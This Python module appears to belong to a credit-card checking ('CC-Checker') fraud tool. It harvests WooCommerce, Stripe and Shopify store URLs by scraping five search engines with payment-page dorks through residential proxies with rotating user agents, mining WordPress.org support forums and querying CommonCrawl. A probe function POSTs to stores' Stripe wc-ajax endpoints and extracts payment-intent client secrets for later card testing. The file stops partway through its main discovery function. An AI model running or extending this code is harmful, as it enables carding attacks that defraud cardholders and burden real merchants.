"""
core/auto_discover.py — Smart Site Discovery Engine v6

Search Sources (all via residential proxy):
  1. Google  — Best results, largest index
  2. Bing    — Good for e-commerce, less strict
  3. Yahoo   — Uses Bing backend, different results
  4. DuckDuckGo — Anonymous, good coverage
  5. Yandex  — Global, finds sites others miss
  6. WordPress.org — Direct WC forum mining
  7. Pre-built US seed sites — Always available

All engines run in PARALLEL for maximum speed.
Proxy makes ALL engines work — no blocking.
"""
import asyncio
import re
import random
import logging
from urllib.parse import urlencode, urlparse, unquote

import aiohttp
from aiohttp import ClientTimeout

from core.site_seeds import (
    US_WOOCOMMERCE_SEEDS,
    US_GOOGLE_DORKS,
    US_DDG_QUERIES,
    WP_ORG_PAGES,
)

logger = logging.getLogger("CC-Checker.AutoDiscover")

PAGE_TIMEOUT  = ClientTimeout(total=20)
PROBE_TIMEOUT = ClientTimeout(total=8)

BROWSER_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/125.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

SKIP_DOMAINS = {
    "stripe.com", "shopify.com", "woocommerce.com", "wordpress.com",
    "wordpress.org", "github.com", "stackoverflow.com", "reddit.com",
    "gofundme.com", "kickstarter.com", "patreon.com", "paypal.com",
    "google.com", "bing.com", "duckduckgo.com", "yahoo.com",
    "amazon.com", "twitter.com", "facebook.com", "youtube.com",
    "medium.com", "linkedin.com", "instagram.com", "tiktok.com",
    "docs.stripe.com", "dev.stripe.com", "yandex.com", "yandex.ru",
    "wikipedia.org", "wikimedia.org",
}

SKIP_KEYWORDS = [
    "docs.", "support.", "help.", "blog.", "forum.", "news.",
    "/docs/", "/blog/", "/support/", "/help/", "/tutorial",
    "github.io", ".edu", ".gov",
]

SECRET_RE = re.compile(
    r'(?:pi|seti)_[a-zA-Z0-9_\-]{10,100}_secret_[a-zA-Z0-9]{10,60}'
)

# ── Smart Multi-Gateway WooCommerce Dorks ──────────────────────────────────────
GOOGLE_DORKS = [
    'inurl:"/my-account/add-payment-method" "woocommerce"',
    'inurl:"/my-account/add-payment-method/" -site:woocommerce.com',
    'inurl:checkout "woocommerce" "add to cart"',
    '"powered by woocommerce" "add to cart" shop online',
    '"wc-ajax=" "checkout" site:.com',
    '"woocommerce" "braintree" "add-payment-method"',
    '"woocommerce" "adyen" "checkout"',
    '"woocommerce" "authorize.net" "add to cart"',
    'inurl:shop "woocommerce" "cart"',
    'inurl:my-account "woocommerce" "payment"',
]

BING_DORKS = [
    'inurl:add-payment-method woocommerce',
    '"woocommerce" checkout "add to cart" site:.com',
    '"wc-ajax=" woocommerce checkout',
    'woocommerce braintree payment checkout',
    'woocommerce adyen checkout payment',
    'woocommerce square payment checkout',
    'inurl:"/my-account/add-payment-method"',
    '"woocommerce" payment gateway "add to cart"',
    '"powered by woocommerce" shop online store',
    '"checkout" woocommerce payment method site:.com',
]

YAHOO_DORKS = [
    'woocommerce shop "add to cart" site:.com',
    'inurl:add-payment-method woocommerce',
    'woocommerce payment shop online usa buy',
    'shop woocommerce checkout online buy site:.com',
]

DDG_DORKS = [
    'woocommerce "add-payment-method" online shop',
    'site:.com inurl:my-account woocommerce',
    'woocommerce payment method shop site:.com',
    'woocommerce buy online shop usa checkout',
    'inurl:add-payment-method woocommerce shop',
]

YANDEX_DORKS = [
    'woocommerce shop buy online checkout',
    '"wc-ajax" woocommerce my-account',
    'woocommerce payment method shop site:com',
]


def _is_valid_target(url: str) -> bool:
    try:
        p = urlparse(url)
        domain = p.netloc.lower().lstrip("www.")
        for skip in SKIP_DOMAINS:
            if domain == skip or domain.endswith("." + skip):
                return False
        full = url.lower()
        if any(kw in full for kw in SKIP_KEYWORDS):
            return False
        return p.scheme.startswith("http") and "." in domain
    except Exception:
        return False


def _base(url: str) -> str:
    try:
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}" if p.netloc else ""
    except Exception:
        return ""


def _extract_urls_from_html(html: str, existing: set) -> list[str]:
    """Generic URL extractor from any search engine HTML."""
    found = []
    # General href pattern
    for m in re.finditer(r'href=["\']?(https?://[^"\'\s<>&]+)', html):
        raw  = unquote(m.group(1).rstrip("&"))
        base = _base(raw)
        if base and base not in existing and _is_valid_target(raw):
            existing.add(base)
            found.append(base)
    return found


# ── Google ────────────────────────────────────────────────────────────────────
async def _google_search(
    session: aiohttp.ClientSession,
    query: str,
    proxy_kwargs: dict,
    max_results: int = 20,
) -> list[str]:
    urls: list[str] = []
    seen: set[str]  = set()
    try:
        pages = max(3, min(15, max_results // 10))
        for page_idx in range(pages):
            start = page_idx * 10
            search_url = "https://www.google.com/search?" + urlencode({
                "q": query, "num": "10", "hl": "en", "gl": "us", "start": str(start),
            })
            kw = {
                "timeout": PAGE_TIMEOUT, "ssl": False,
                "headers": {
                    **BROWSER_HEADERS,
                    "Referer": "https://www.google.com/",
                    "User-Agent": random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
                    ]),
                },
            }
            kw.update(proxy_kwargs)
            async with session.get(search_url, **kw) as r:
                if r.status != 200:
                    break
                html = await r.text(errors="ignore")

            # Google result URLs
            found_any = False
            for m in re.finditer(r'/url\?q=(https?://[^&"]+)&', html):
                raw  = unquote(m.group(1))
                base = _base(raw)
                if base and base not in seen and _is_valid_target(raw):
                    seen.add(base)
                    urls.append(base)
                    found_any = True
                    if len(urls) >= max_results:
                        return urls

            # Fallback Google parser if standard URL redirect structure changed
            if not found_any:
                extracted = _extract_urls_from_html(html, seen)
                for base in extracted:
                    urls.append(base)
                    if len(urls) >= max_results:
                        return urls

            await asyncio.sleep(random.uniform(1.0, 2.5))

        logger.info(f"Google: {len(urls)} | {query[:40]}")
    except Exception as e:
        logger.debug(f"Google error: {e}")
    return urls


# ── Bing ──────────────────────────────────────────────────────────────────────
async def _bing_search(
    session: aiohttp.ClientSession,
    query: str,
    proxy_kwargs: dict,
    max_results: int = 20,
) -> list[str]:
    urls: list[str] = []
    seen: set[str]  = set()
    try:
        pages = max(3, min(15, max_results // 10))
        for page_idx in range(pages):
            first = page_idx * 10 + 1
            search_url = "https://www.bing.com/search?" + urlencode({
                "q": query, "first": str(first), "count": "10", "mkt": "en-US",
            })
            kw = {
                "timeout": PAGE_TIMEOUT, "ssl": False,
                "headers": {
                    **BROWSER_HEADERS,
                    "Referer": "https://www.bing.com/",
                },
            }
            kw.update(proxy_kwargs)
            async with session.get(search_url, **kw) as r:
                if r.status != 200:
                    break
                html = await r.text(errors="ignore")

            # Bing uses <a href="http..." h="ID=...">
            found_any = False
            for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"[^>]*h="ID=SERP', html):
                raw  = m.group(1)
                base = _base(raw)
                if base and base not in seen and _is_valid_target(raw):
                    seen.add(base)
                    urls.append(base)
                    found_any = True
                    if len(urls) >= max_results:
                        return urls

            # Alternative Bing pattern
            for m in re.finditer(r'"url":"(https?://[^"]+)"', html):
                raw  = unquote(m.group(1))
                base = _base(raw)
                if base and base not in seen and _is_valid_target(raw):
                    seen.add(base)
                    urls.append(base)
                    found_any = True
                    if len(urls) >= max_results:
                        return urls

            if not found_any:
                extracted = _extract_urls_from_html(html, seen)
                for base in extracted:
                    urls.append(base)
                    if len(urls) >= max_results:
                        return urls

            await asyncio.sleep(random.uniform(1.0, 2.5))

        logger.info(f"Bing: {len(urls)} | {query[:40]}")
    except Exception as e:
        logger.debug(f"Bing error: {e}")
    return urls


# ── Yahoo ─────────────────────────────────────────────────────────────────────
async def _yahoo_search(
    session: aiohttp.ClientSession,
    query: str,
    proxy_kwargs: dict,
    max_results: int = 15,
) -> list[str]:
    urls: list[str] = []
    seen: set[str]  = set()
    try:
        pages = max(1, min(5, max_results // 15))
        for page_idx in range(pages):
            b = page_idx * 10 + 1
            search_url = "https://search.yahoo.com/search?" + urlencode({
                "p": query, "n": "50", "ei": "UTF-8", "fl": "1", "vl": "lang_en", "b": str(b),
            })
            kw = {
                "timeout": PAGE_TIMEOUT, "ssl": False,
                "headers": {
                    **BROWSER_HEADERS,
                    "Referer": "https://search.yahoo.com/",
                },
            }
            kw.update(proxy_kwargs)
            async with session.get(search_url, **kw) as r:
                if r.status != 200:
                    break
                html = await r.text(errors="ignore")

            # Yahoo redirects through /RU=https%3A%2F%2F...
            for m in re.finditer(r'/RU=(https?%3A%2F%2F[^/]+)', html):
                raw  = unquote(m.group(1))
                base = _base(raw)
                if base and base not in seen and _is_valid_target(raw):
                    seen.add(base)
                    urls.append(base)
                    if len(urls) >= max_results:
                        return urls

            # Also raw hrefs
            for m in re.finditer(r'href="(https?://[^"]+)"', html):
                raw  = m.group(1)
                base = _base(raw)
                if base and base not in seen and _is_valid_target(raw):
                    seen.add(base)
                    urls.append(base)
                    if len(urls) >= max_results:
                        return urls

            await asyncio.sleep(random.uniform(1.0, 2.0))

        logger.info(f"Yahoo: {len(urls)} | {query[:40]}")
    except Exception as e:
        logger.debug(f"Yahoo error: {e}")
    return urls


# ── DuckDuckGo ────────────────────────────────────────────────────────────────
async def _ddg_search(
    session: aiohttp.ClientSession,
    query: str,
    proxy_kwargs: dict,
    max_results: int = 15,
) -> list[str]:
    urls: list[str] = []
    seen: set[str]  = set()
    try:
        search_url = "https://html.duckduckgo.com/html/?" + urlencode({
            "q": query, "kl": "us-en", "kp": "-1", "k1": "-1",
        })
        kw = {
            "timeout": PAGE_TIMEOUT, "ssl": False,
            "headers": {**BROWSER_HEADERS, "Referer": "https://duckduckgo.com/"},
        }
        kw.update(proxy_kwargs)
        async with session.get(search_url, **kw) as r:
            if r.status != 200:
                return []
            html = await r.text(errors="ignore")

        for m in re.finditer(r"uddg=([^&\"'\s<>]+)", html):
            raw  = unquote(m.group(1))
            if not raw.startswith("http"):
                continue
            base = _base(raw)
            if base and base not in seen and _is_valid_target(raw):
                seen.add(base)
                urls.append(base)
                if len(urls) >= max_results:
                    break

        logger.info(f"DDG: {len(urls)} | {query[:40]}")
    except Exception as e:
        logger.debug(f"DDG error: {e}")
    return urls


# ── Yandex ────────────────────────────────────────────────────────────────────
async def _yandex_search(
    session: aiohttp.ClientSession,
    query: str,
    proxy_kwargs: dict,
    max_results: int = 15,
) -> list[str]:
    urls: list[str] = []
    seen: set[str]  = set()
    try:
        pages = max(1, min(5, max_results // 15))
        for page_idx in range(pages):
            search_url = "https://yandex.com/search/?" + urlencode({
                "text": query, "lr": "10393", "p": str(page_idx),
            })
            kw = {
                "timeout": PAGE_TIMEOUT, "ssl": False,
                "headers": {
                    **BROWSER_HEADERS,
                    "Referer": "https://yandex.com/",
                },
            }
            kw.update(proxy_kwargs)
            async with session.get(search_url, **kw) as r:
                if r.status != 200:
                    break
                html = await r.text(errors="ignore")

            # Yandex result URLs
            for m in re.finditer(r'"url":"(https?://[^"]+)"', html):
                raw  = unquote(m.group(1))
                base = _base(raw)
                if base and base not in seen and _is_valid_target(raw):
                    seen.add(base)
                    urls.append(base)
                    if len(urls) >= max_results:
                        return urls

            for m in re.finditer(r'href="(https?://[^"]+)"[^>]*class="[^"]*organic', html):
                raw  = m.group(1)
                base = _base(raw)
                if base and base not in seen and _is_valid_target(raw):
                    seen.add(base)
                    urls.append(base)
                    if len(urls) >= max_results:
                        return urls

            await asyncio.sleep(random.uniform(1.0, 2.0))

        logger.info(f"Yandex: {len(urls)} | {query[:40]}")
    except Exception as e:
        logger.debug(f"Yandex error: {e}")
    return urls


# ── WordPress.org Deep Topic Mining ──────────────────────────────────────────
async def _scrape_wordpress_org(
    session: aiohttp.ClientSession,
    proxy_kwargs: dict,
) -> list[str]:
    urls: list[str] = []
    seen: set[str]  = set()
    topic_urls: set[str] = set()

    plugin_forums = [
        "https://wordpress.org/support/plugin/woocommerce-gateway-stripe/",
        "https://wordpress.org/support/plugin/woocommerce/",
        "https://wordpress.org/support/plugin/woo-stripe-payment/",
        "https://wordpress.org/support/plugin/woocommerce-payments/",
        "https://wordpress.org/support/plugin/give/",
    ]

    listing_pages = []
    for forum in plugin_forums:
        listing_pages.append(forum)
        for p in range(2, 6):
            listing_pages.append(f"{forum}page/{p}/")

    # Step 1: Collect support topic thread URLs
    async def fetch_forum_listing(url):
        try:
            kw = {"timeout": PAGE_TIMEOUT, "ssl": False, "headers": BROWSER_HEADERS}
            kw.update(proxy_kwargs)
            async with session.get(url, **kw) as r:
                if r.status == 200:
                    html = await r.text(errors="ignore")
                    for m in re.finditer(r'href="(https://wordpress.org/support/topic/[^"/]+/)', html):
                        topic_urls.add(m.group(1))
        except Exception:
            pass

    await asyncio.gather(*[fetch_forum_listing(u) for u in listing_pages], return_exceptions=True)
    logger.info(f"WordPress.org: Harvested {len(topic_urls)} topic threads")

    # Step 2: Extract merchant site URLs from topic threads
    async def fetch_topic_merchant_sites(topic_url):
        try:
            kw = {"timeout": PAGE_TIMEOUT, "ssl": False, "headers": BROWSER_HEADERS}
            kw.update(proxy_kwargs)
            async with session.get(topic_url, **kw) as r:
                if r.status == 200:
                    html = await r.text(errors="ignore")
                    for m in re.finditer(r'href=["\']?(https?://[^"\'\s<>&]+)', html):
                        raw_url = unquote(m.group(1).rstrip("&"))
                        base = _base(raw_url)
                        if base and base not in seen and _is_valid_target(raw_url):
                            seen.add(base)
                            urls.append(base)
        except Exception:
            pass

    # Batch process topics (up to 150 topic threads)
    topics_to_mine = list(topic_urls)[:150]
    for i in range(0, len(topics_to_mine), 25):
        batch = topics_to_mine[i:i+25]
        await asyncio.gather(*[fetch_topic_merchant_sites(t) for t in batch], return_exceptions=True)

    logger.info(f"WordPress.org Deep Mining: {len(urls)} real merchant sites harvested")
    return urls


# ── Pre-built seed sites ───────────────────────────────────────────────────────
def get_seed_sites(count: int = 30) -> list[str]:
    seeds = [s for s in US_WOOCOMMERCE_SEEDS if s.startswith("http")]
    random.shuffle(seeds)
    return seeds[:count]


# ── WooCommerce fast endpoint prober ──────────────────────────────────────────
async def probe_woocommerce_endpoint(
    session: aiohttp.ClientSession,
    base_url: str,
    proxy_kwargs: dict,
) -> dict | None:
    """Directly probe WooCommerce Stripe endpoint. Returns info if working."""
    endpoints = [
        "/?wc-ajax=stripe_create_payment_intent",
        "/?wc-ajax=create_stripe_setup_intent",
        "/?wc-ajax=wc_stripe_create_payment_intent",
        "/?give_action=create_payment_intent",
    ]
    headers = {
        "User-Agent": BROWSER_HEADERS["User-Agent"],
        "Accept": "application/json, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
    }
    for ep in endpoints:
        full = base_url.rstrip("/") + ep
        try:
            kw = {
                "timeout": PROBE_TIMEOUT, "ssl": False,
                "allow_redirects": False,
                "headers": headers,
                "data": "amount=100&currency=usd&nonce=abc",
            }
            kw.update(proxy_kwargs)
            async with session.post(full, **kw) as r:
                if r.status in (200, 201):
                    text = await r.text(errors="ignore")
                    m = SECRET_RE.search(text)
                    if m:
                        secret = m.group(0)
                        return {
                            "base_url": base_url,
                            "endpoint": ep,
                            "client_secret": secret,
                            "intent_type": "setup_intent" if secret.startswith("seti_") else "payment_intent",
                        }
        except Exception:
            pass
    return None


# ── CommonCrawl Shopify Discovery (FREE — no proxy, no auth) ──────────────────
# Indexes are tried in order. Unreachable ones are auto-skipped.
_CC_INDEXES = [
    "CC-MAIN-2025-21",   # newest — try first
    "CC-MAIN-2025-18",
    "CC-MAIN-2025-13",
    "CC-MAIN-2025-08",
    "CC-MAIN-2025-05",
    "CC-MAIN-2024-51",
    "CC-MAIN-2024-46",
    "CC-MAIN-2024-42",
    "CC-MAIN-2024-38",
    "CC-MAIN-2024-33",
    "CC-MAIN-2024-30",
    "CC-MAIN-2024-26",
    "CC-MAIN-2024-22",
    "CC-MAIN-2024-18",
    "CC-MAIN-2024-10",
]
# Query patterns — multiple patterns catch different types of stores
_CC_QUERIES = [
    "*.myshopify.com/products/*",   # stores WITH actual product pages (higher quality)
    "*.myshopify.com/collections/*", # stores with collections
    "*.myshopify.com/",              # homepage-indexed stores
]
_CC_SKIP = {"admin","store","adminconsole","shop","accounts","help","new","partners","checkout","api","cdn"}
_CC_UA   = "Mozilla/5.0 (compatible; research-bot/1.0)"


async def _cc_get_pages(session: aiohttp.ClientSession, index_name: str, query: str = "*.myshopify.com/products/*") -> int:
    try:
        async with session.get(
            f"https://index.commoncrawl.org/{index_name}-index",
            params={"url": query, "output": "json", "showNumPages": "true"},
            timeout=ClientTimeout(total=20), headers={"User-Agent": _CC_UA}, ssl=True,
        ) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                return int(data.get("pages", 0))
    except Exception as e:
        logger.debug(f"CC page count ({index_name}): {e}")
    return 0


async def _cc_fetch_page(session: aiohttp.ClientSession, index_name: str, page: int, seen: set, query: str = "*.myshopify.com/products/*") -> list:
    import json as _json
    found = []
    try:
        async with session.get(
            f"https://index.commoncrawl.org/{index_name}-index",
            params={"url": query, "output": "json", "limit": "1000",
                    "page": str(page), "fields": "url", "filter": "=status:200"},
            timeout=ClientTimeout(total=30), headers={"User-Agent": _CC_UA}, ssl=True,
        ) as r:
            if r.status != 200:
                return []
            text = await r.text()
            for line in text.strip().split("\n"):
                if not line.strip():
                    continue
                try:
                    raw_url = _json.loads(line).get("url", "")
                    m = re.match(r"https?://([\w\-]+\.myshopify\.com)", raw_url, re.I)
                    if not m:
                        continue
                    subdomain = m.group(1).lower().split(".")[0]
                    if subdomain in _CC_SKIP:
                        continue
                    base = f"https://{m.group(1).lower()}"
                    if base not in seen:
                        seen.add(base)
                        found.append(base)
                except Exception:
                    pass
    except Exception as e:
        logger.debug(f"CC fetch ({index_name} p{page}): {e}")
    return found


async def discover_shopify_via_commoncrawl(count: int = 500, progress_cb=None, exclude: set = None) -> list:
    """
    Discover Shopify stores from CommonCrawl CDX API.
    FREE — no proxy, no API key, no auth needed.
    Tries multiple query patterns per index for maximum unique store coverage.
    `exclude` — set of already-known URLs to skip at fetch time.
    """
    seen: set   = set(exclude or set())
    found: list = []
    BATCH_SIZE  = 10

    connector = aiohttp.TCPConnector(ssl=True, limit=15, force_close=True)

    async with aiohttp.ClientSession(connector=connector) as session:
        for idx_name in _CC_INDEXES:
            if len(found) >= count:
                break

            # Try each query pattern — 3 patterns = 3x more unique stores
            for query in _CC_QUERIES:
                if len(found) >= count:
                    break

                total_pages = await _cc_get_pages(session, idx_name, query)
                if total_pages == 0:
                    continue  # no data for this query in this index

                q_short = query.split("myshopify.com/")[1].rstrip("/*") or "home"
                logger.info(
                    f"CC {idx_name} [{q_short}]: "
                    f"{total_pages} pages, need {count - len(found)} more stores"
                )

                page        = 0
                idx_new     = 0
                zero_runs   = 0  # consecutive all-known batches

                while page < total_pages and len(found) < count:
                    batch_pages = list(range(page, min(page + BATCH_SIZE, total_pages)))

                    _idx = idx_name
                    _q   = query
                    async def fetch_page(p: int, _i: str = _idx, _qr: str = _q) -> list:
                        return await _cc_fetch_page(session, _i, p, seen, _qr)

                    results = await asyncio.gather(
                        *[fetch_page(p) for p in batch_pages],
                        return_exceptions=True
                    )

                    batch_new = 0
                    for res in results:
                        if isinstance(res, list) and res:
                            found.extend(res)
                            batch_new += len(res)
                            idx_new   += len(res)

                    if batch_new > 0:
                        zero_runs = 0
                        logger.info(
                            f"CC {idx_name} p{page}-{batch_pages[-1]}: "
                            f"+{batch_new} new → total {len(found)}/{count}"
                        )
                    else:
                        zero_runs += 1
                        logger.debug(f"CC {idx_name} p{page}-{batch_pages[-1]}: all known (#{zero_runs})")
                        if zero_runs >= 3:
                            logger.info(f"CC {idx_name} [{q_short}]: 3 empty batches, switching query")
                            break

                    if progress_cb:
                        await progress_cb(len(found), count)

                    page += BATCH_SIZE
                    await asyncio.sleep(0.3)

                if idx_new > 0:
                    logger.info(f"CC {idx_name} [{q_short}]: +{idx_new}. Total: {len(found)}")

            await asyncio.sleep(0.5)

    import random as _r
    _r.shuffle(found)
    logger.info(f"CommonCrawl done: {len(found)} unique NEW Shopify stores across all indexes")
    return found[:count]


# ── Shopify Dorks ──────────────────────────────────────────────────────────────

SHOPIFY_GOOGLE_DORKS = [
    'site:myshopify.com',
    'inurl:myshopify.com "add to cart"',
    '"cdn.shopify.com" "add to cart" inurl:products site:.com',
    'inurl:"/products.json" shopify "variants" "price"',
    '"powered by shopify" shop online cheap -site:shopify.com',
    '"shopify.com/s/files" "add to cart" usa shop',
    'inurl:myshopify.com cheap products buy',
    '"myshopify.com/products" price site:.com',
    '"x-shopify-shop-id" inurl:checkout',
    'shopify checkout "add to cart" buy now online shop usa',
    '"cdn.shopify.com" shop usa inurl:products',
    'shopify store usa "free shipping" "add to cart" cheap',
    'inurl:myshopify.com online store usa buy cheap',
    '"Shopify.theme" site:.com online shop',
    '"shopify.com/assets" shop buy cheap price',
]

SHOPIFY_BING_DORKS = [
    'site:myshopify.com buy cheap',
    '"shopify" "add to cart" "buy now" cheap online store usa',
    'shopify store usa "add to cart" products cheap',
    '"cdn.shopify.com" cheap online store',
    'myshopify.com products cheap buy',
    '"shopify" checkout online shop products',
    'buy online cheap shopify store usa',
    '"Shopify" payment online shop usa small business',
    'shopify store products cheap buy usa -site:shopify.com',
    'inurl:products.json shopify cheap',
]

SHOPIFY_YAHOO_DORKS = [
    '"myshopify.com" products buy cheap',
    '"shopify" cheap shop usa online',
    '"cdn.shopify.com" online store',
    '"powered by shopify" cheap products',
    'shopify store cheap buy now usa',
]

SHOPIFY_DDG_DORKS = [
    'site:myshopify.com',
    '"shopify" "add to cart" cheap shop online usa',
    'myshopify.com cheap products buy',
    '"cdn.shopify.com" shop cheap',
    '"powered by shopify" buy cheap usa',
]

SHOPIFY_YANDEX_DORKS = [
    'myshopify.com buy cheap products',
    '"shopify" "add to cart" online store usa',
    '"cdn.shopify.com" shop cheap buy',
]


# ── Shopify-dedicated URL extractor (bypasses WC skip filter) ─────────────────
def _extract_shopify_urls(html: str, seen: set) -> list[str]:
    """
    Extract Shopify store URLs from search engine HTML.
    - Pulls *.myshopify.com directly (they're blocked by WC's SKIP_DOMAINS)
    - Also pulls regular custom-domain Shopify stores from search results
    """
    found = []

    # Pattern 1: Direct .myshopify.com URLs anywhere in HTML
    for m in re.finditer(r'(https?://[\w\-]+\.myshopify\.com)', html, re.I):
        base = m.group(1).rstrip("/").lower()
        # Normalize to base URL only
        try:
            p = urlparse(base)
            base = f"{p.scheme}://{p.netloc}"
        except Exception:
            pass
        if base and base not in seen and "myshopify.com" in base:
            # Skip Shopify's own domains
            if base in ("https://myshopify.com", "http://myshopify.com"):
                continue
            seen.add(base)
            found.append(base)

    # Pattern 2: Google /url?q= redirects → extract destination
    for m in re.finditer(r'/url\?q=(https?://[^&"]+)&', html):
        raw = unquote(m.group(1))
        try:
            p   = urlparse(raw)
            domain = p.netloc.lower().lstrip("www.")
            base   = f"{p.scheme}://{p.netloc}"
            # Accept .myshopify.com subdomains
            if domain.endswith(".myshopify.com") and base not in seen:
                seen.add(base)
                found.append(base)
                continue
            # Accept regular custom domains (non-skip)
            skip_check = SKIP_DOMAINS | {"shopify.com", "myshopify.com", "shopifycdn.com"}
            if any(domain == s or domain.endswith("." + s) for s in skip_check):
                continue
            if p.scheme.startswith("http") and "." in domain and base not in seen:
                seen.add(base)
                found.append(base)
        except Exception:
            pass

    return found


async def _shopify_search_engine(
    session: aiohttp.ClientSession,
    engine: str,
    query: str,
    proxy_kwargs: dict,
    max_results: int,
    seen: set,
) -> list[str]:
    """Generic search engine caller for Shopify discovery — allows myshopify.com URLs."""
    urls = []
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    ]
    try:
        pages = max(2, min(10, max_results // 10))
        for page_idx in range(pages):
            if engine == "google":
                search_url = "https://www.google.com/search?" + urlencode({
                    "q": query, "num": "10", "hl": "en", "gl": "us",
                    "start": str(page_idx * 10),
                })
                referer = "https://www.google.com/"
            elif engine == "bing":
                search_url = "https://www.bing.com/search?" + urlencode({
                    "q": query, "first": str(page_idx * 10 + 1), "count": "10", "mkt": "en-US",
                })
                referer = "https://www.bing.com/"
            elif engine == "yahoo":
                search_url = "https://search.yahoo.com/search?" + urlencode({
                    "p": query, "b": str(page_idx * 10 + 1), "pz": "10",
                })
                referer = "https://search.yahoo.com/"
            elif engine == "ddg":
                search_url = "https://html.duckduckgo.com/html/?" + urlencode({
                    "q": query, "s": str(page_idx * 30),
                })
                referer = "https://duckduckgo.com/"
            elif engine == "yandex":
                search_url = "https://yandex.com/search/?" + urlencode({
                    "text": query, "p": str(page_idx),
                })
                referer = "https://yandex.com/"
            else:
                break

            kw = {
                "timeout": PAGE_TIMEOUT, "ssl": False,
                "headers": {
                    **BROWSER_HEADERS,
                    "Referer": referer,
                    "User-Agent": random.choice(ua_list),
                },
                "allow_redirects": True,
            }
            kw.update(proxy_kwargs)
            try:
                async with session.get(search_url, **kw) as r:
                    if r.status != 200:
                        break
                    html = await r.text(errors="ignore")
            except Exception as e:
                logger.debug(f"[Shopify/{engine}] page {page_idx} error: {e}")
                break

            new = _extract_shopify_urls(html, seen)
            urls.extend(new)
            logger.debug(f"[Shopify/{engine}] page {page_idx}: +{len(new)} (total {len(urls)})")

            if len(urls) >= max_results:
                break

            await asyncio.sleep(random.uniform(1.5, 3.0))

    except Exception as e:
        logger.debug(f"[Shopify/{engine}] error: {e}")
    return urls


# ── Shopify site discovery ─────────────────────────────────────────────────────
async def discover_shopify_sites(
    count: int = 50,
    proxy: dict = None,
    progress_cb=None,
    exclude: set = None,
) -> list[str]:
    """
    Discover Shopify stores using ALL search engines in parallel.
    `exclude` — set of already-known URLs to skip at fetch time.
    Returns only genuinely NEW URLs (not in exclude).
    """
    if not proxy:
        logger.warning("No proxy — cannot search for Shopify sites")
        return []

    # Build proxy connector
    try:
        from core.proxy_manager import get_connector, get_proxy_kwargs
        connector    = get_connector(proxy)
        proxy_kwargs = get_proxy_kwargs(proxy)
    except Exception:
        proxy_url = f"http://{proxy.get('username','')}:{proxy.get('password','')}@{proxy['host']}:{proxy['port']}"
        connector    = aiohttp.TCPConnector(ssl=False, limit=20, force_close=True)
        proxy_kwargs = {"proxy": proxy_url}

    # Pre-seed all_seen with excluded URLs so search extractor skips them
    all_seen: set[str] = set(exclude or set())
    found_list: list[str] = []

    # Scale dorks based on count requested
    n_dorks_g = min(len(SHOPIFY_GOOGLE_DORKS), max(3, count // 15))
    n_dorks_b = min(len(SHOPIFY_BING_DORKS),   max(3, count // 15))
    n_dorks_y = min(len(SHOPIFY_YAHOO_DORKS),  max(2, count // 20))
    n_dorks_d = min(len(SHOPIFY_DDG_DORKS),    max(2, count // 20))
    n_dorks_x = min(len(SHOPIFY_YANDEX_DORKS), max(2, count // 25))

    async with aiohttp.ClientSession(connector=connector) as session:

        logger.info(f"Shopify discovery: target={count}, 5 engines parallel, excluding {len(all_seen)} known")

        async def run_engine(engine: str, dorks: list, n_dorks: int):
            engine_urls = []
            selected = random.sample(dorks, n_dorks) if n_dorks < len(dorks) else dorks
            per_query = max(15, count // max(n_dorks, 1))
            for dork in selected:
                try:
                    new_urls = await _shopify_search_engine(
                        session, engine, dork, proxy_kwargs, per_query, all_seen
                    )
                    engine_urls.extend(new_urls)
                    found_list.extend(new_urls)
                    if progress_cb:
                        await progress_cb(len(found_list), count)
                    await asyncio.sleep(random.uniform(1.0, 2.0))
                except Exception as e:
                    logger.debug(f"Shopify/{engine} dork error: {e}")
            logger.info(f"Shopify/{engine}: {len(engine_urls)} new sites found")
            return engine_urls

        tasks = [
            run_engine("google",  SHOPIFY_GOOGLE_DORKS, n_dorks_g),
            run_engine("bing",    SHOPIFY_BING_DORKS,   n_dorks_b),
            run_engine("yahoo",   SHOPIFY_YAHOO_DORKS,  n_dorks_y),
            run_engine("ddg",     SHOPIFY_DDG_DORKS,    n_dorks_d),
            run_engine("yandex",  SHOPIFY_YANDEX_DORKS, n_dorks_x),
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

    unique: list[str] = list(dict.fromkeys(found_list))
    random.shuffle(unique)
    logger.info(f"Shopify discovery done: {len(unique)} genuinely new sites")
    return unique


# ── Main discovery ────────────────────────────────────────────────────────────
async def discover_stripe_sites(
    count: int = 30,
    proxy: dict = None,
    progress_cb=None,
) -> list[str]:
    """
    Discover WooCommerce+Stripe sites using ALL search engines in parallel.

    Uses Google + Bing + Yahoo + DuckDuckGo + Yandex + WordPress.org
    All via residential proxy for best results.
    """
    all_urls: set[str] = set()
    found_list: list[str] = []

    # Seed sites — always included
    seeds = get_seed_sites(min(count, len(US_WOOCOMMERCE_SEEDS)))
    all_urls.update(seeds)
    found_list.extend(seeds)
    logger.info(f"Seeds: {len(seeds)}")
    if progress_cb:
        await progress_cb(len(all_urls), count)

    if not proxy:
        logger.warning("No proxy — seed sites only")
        random.shuffle(found_list)
        return found_list[:count]

    from core.proxy_manager import get_connector, get_proxy_kwargs
    connector    = get_connector(proxy)
    proxy_kwargs = get_proxy_kwargs(proxy)

